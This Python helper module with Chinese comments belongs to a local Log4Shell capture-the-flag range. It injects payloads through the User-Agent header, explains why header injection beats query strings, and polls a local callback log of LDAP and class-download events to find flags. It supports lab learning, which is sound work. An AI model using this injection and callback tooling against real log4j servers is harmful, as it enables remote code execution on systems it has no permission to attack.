"""log4shell 靶场的公共小工具，只用标准库。

这里不碰任何第三方库：发 HTTP 用 urllib，查结果用 /events 的 JSON，
等结果用轮询。和 gopher / redis-rce 那几套 poc 是同一个路子，
方便单独看懂每一关在干什么。
"""

import json
import re
import time
import urllib.error
import urllib.request

APP = "http://127.0.0.1:19080"      # 2.14.1 + trustURLCodebase=true
JDK = "http://127.0.0.1:19081"      # 2.14.1 + JDK 默认（禁远程 codebase）
FIX = "http://127.0.0.1:19082"      # 2.17.1，已修复
EVENTS = "http://127.0.0.1:19089/events"
RESET = "http://127.0.0.1:19089/reset"

FLAG_RE = re.compile(r"FLAG\{[^}]*\}")


def _get(url, timeout=6):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def reset():
    _get(RESET)


def events():
    try:
        return json.loads(_get(EVENTS))
    except (OSError, ValueError):
        return []


def inject(base, payload, path="/", timeout=20):
    """把 payload 塞进 User-Agent 发一次请求。

    Log4Shell 最经典的注入点就是日志里常见的 User-Agent / X-Forwarded-For
    这类"随手记下来"的字段。这里走 header 而不是 query，是因为 query 会做
    URL 编码，${ 变成 %24%7B 之后 log4j 就不认了。
    """
    req = urllib.request.Request(base + path, headers={"User-Agent": payload})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except OSError as e:
        return 0, "请求失败：%s" % e


def wait(pred, timeout=12, interval=0.4):
    """轮询 /events 直到满足条件。返回最后的事件快照。"""
    deadline = time.time() + timeout
    while time.time() < deadline:
        snap = events()
        if pred(snap):
            return snap
        time.sleep(interval)
    return events()


def kinds(snap, name):
    return [e for e in snap if e.get("kind") == name]


def find_flag(snap):
    """在整份事件里找 flag —— L1 在 base 里，L2/L3 在 collect.body 里。"""
    for m in FLAG_RE.finditer(json.dumps(snap, ensure_ascii=False)):
        return m.group(0)
    return None


def show_events(snap):
    """把事件压成几行，看得清整条利用链。

    L3 的混淆 payload 会被 log4j 递归替换很多轮，同一条链能重复十几次。
    这里按语义去重、按首次出现顺序显示，重复的标 ×N，不刷屏也不丢信息。
    ldap_raw 是最底层的原始字节，平时跳过，排障时直接看 /events。
    """
    order, count = [], {}
    for e in snap:
        k = e.get("kind")
        if k == "ldap_bind":
            row = "   [ldap]  bindRequest       目标连上来了"
        elif k == "ldap_search":
            row = "   [ldap]  searchRequest     base=%s" % e.get("base", "")
        elif k == "codebase":
            row = "   [http]  GET %-12s 目标来下载 class 了" % e.get("file", "")
        elif k == "collect":
            row = "   [http]  POST /collect     %s" % e.get("body", "")
        else:
            continue
        if row not in count:
            order.append(row)
            count[row] = 0
        count[row] += 1

    if not order:
        print("   （没有任何回连）")
        return
    for row in order:
        n = count[row]
        print(row + ("  ×%d" % n if n > 1 else ""))
